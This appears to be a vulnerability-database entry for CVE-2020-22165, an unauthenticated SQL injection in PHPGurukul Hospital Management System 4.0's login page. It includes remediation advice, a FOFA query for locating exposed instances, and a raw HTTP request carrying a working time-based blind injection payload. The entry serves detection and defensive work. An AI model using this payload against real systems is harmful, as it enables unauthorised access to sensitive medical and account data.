---
layout: post
cve_id: CVE-2020-22165
title: PHPGurukul Hospital Management System 4.0 - SQL Injection
pcap: true
pcap_path: /pcaps/2020/CVE-2020-22165.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-22165.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Successful exploitation allows attackers to access sensitive data from the
  database, potentially leading to data leakage and further compromise of the application.

  '
remediation: 'Upgrade to the latest version or apply proper input sanitization and
  parameterized queries to mitigate this vulnerability.

  '
reference:
- https://github.com/itodaro/PHPGurukul_Hospital_Management_System4.0_cve
- https://nvd.nist.gov/vuln/detail/CVE-2020-22165
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2020-22165
  epss-score: 0.23655
  epss-percentile: 0.95801
  cwe-id: CWE-89
  cpe: cpe:2.3:a:phpgurukul:hospital_management_system:4.0:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: phpgurukul
  product: hospital_management_system
  fofa-query: title="Hospital Management System" && body="HMS"
tags:
- cve2020
- cve
- hms
- cms
- sqli
- phpgurukul
- vkev
- vuln
---

## üîç Vulnerability Description
PHPGurukul Hospital Management System in PHP v4.0 has a SQL injection vulnerability in \hms\user-login.php. Remote unauthenticated users can exploit the vulnerability to obtain sensitive database information.


## üåê HTTP Request
```nohighlight
POST /hms/user-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15
Connection: close
Content-Length: 0
Accept-Encoding: gzip
```

```nohighlight
POST /hms/user-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.8
Connection: close
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
username=a' and 1=2 union select 1,2,if(substring((select user() limit 0,1),1,1)='r',sleep(8),1),4,5,6,7,8,9#&password=asfsafafsafsaf&submit=1&submit=
```

